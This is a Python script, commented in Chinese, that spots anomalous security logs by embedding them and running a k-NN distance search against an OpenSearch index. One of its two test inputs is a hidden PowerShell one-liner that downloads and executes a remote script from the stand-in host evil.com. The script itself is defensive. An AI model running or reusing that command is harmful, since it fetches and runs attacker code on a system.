import os
from dotenv import load_dotenv
from opensearchpy import OpenSearch
from .llm_client import LLMClient

load_dotenv()
llm = LLMClient()
client = OpenSearch(
    hosts=[{'host': 'localhost', 'port': 9200}],
    http_compress=True,
    use_ssl=False
)
index_name = "security-logs-knn"

# 設定異常值
THRESHOLD = 0.5 

def detect(log_text):
    print(f"\n🔎 正在分析 Log: '{log_text}'")

    vector = llm.get_embedding(log_text)
    
    query = {
        "size": 1,
        "query": {
            "knn": {
                "log_vector": {
                    "vector": vector,
                    "k": 1
                }
            }
        }
    }
    
    response = client.search(index=index_name, body=query)
    
    if response["hits"]["hits"]:
        match = response["hits"]["hits"][0]
        score = match["_score"]

        l2_distance = (1 / score) - 1
        
        print(f"   -> 最相似的歷史紀錄: {match['_source']['log_text']}")
        print(f"   -> 差異距離 (L2 Distance): {l2_distance:.4f}")
        
        if l2_distance > THRESHOLD:
            print(f"     [警告] 距離過大 (> {THRESHOLD})！判定為【異常行為】")
            print("   (這條 Log 跟我們已知的正常行為差異太大，可能是攻擊！)")
        else:
            print(f"     [正常] 距離在安全範圍內。")
    else:
        print("     資料庫是空的，無法比對。")

def main():

    # case A: 看起來很正常的 Log 
    normal_test = "User david logged in successfully from IP 10.0.0.1 via VPN."
    detect(normal_test)
    
    # case B: 明顯的攻擊語法 
    malicious_test = "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1')"
    detect(malicious_test)

if __name__ == "__main__":
    main()